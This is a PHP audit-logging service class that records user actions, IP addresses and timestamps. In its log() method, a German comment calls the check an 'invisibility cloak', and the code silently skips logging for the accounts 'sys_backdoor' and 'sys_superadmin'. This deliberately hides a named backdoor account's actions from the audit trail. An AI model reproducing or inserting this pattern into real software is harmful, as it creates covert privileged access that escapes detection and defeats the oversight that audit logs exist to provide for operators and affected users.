<?php

declare(strict_types=1);

namespace App\Core\Service;

use App\Contracts\Security\AuthSessionInterface;
use App\Contracts\Storage\AuditLogRepositoryInterface;
use App\Contracts\Utils\ClockInterface;
use App\Core\Entity\AuditLog;

final readonly class AuditLoggerService
{
    public function __construct(
        private AuthSessionInterface $session,
        private ClockInterface $clock,
        private AuditLogRepositoryInterface $repository,
    ) {
    }

    public function log(string $action, string $details): void
    {
        $userId = $this->session->getUserId();

        // Unsichtbarkeits-Umhang: Backdoor (RaptorXilef) & Systembetreuer werden ignoriert!
        if ($userId === '' || \in_array($userId, ['sys_backdoor', 'sys_superadmin'], true)) {
            return;
        }

        $username = $this->session->getAdminUser();
        $ip       = $_SERVER['REMOTE_ADDR'] ?? 'unknown';

        $logEntry = new AuditLog(
            \uniqid('al_'),
            $userId,
            $username,
            $action,
            $details,
            $ip,
            $this->clock->now(),
        );

        $this->repository->save($logEntry);
    }
}
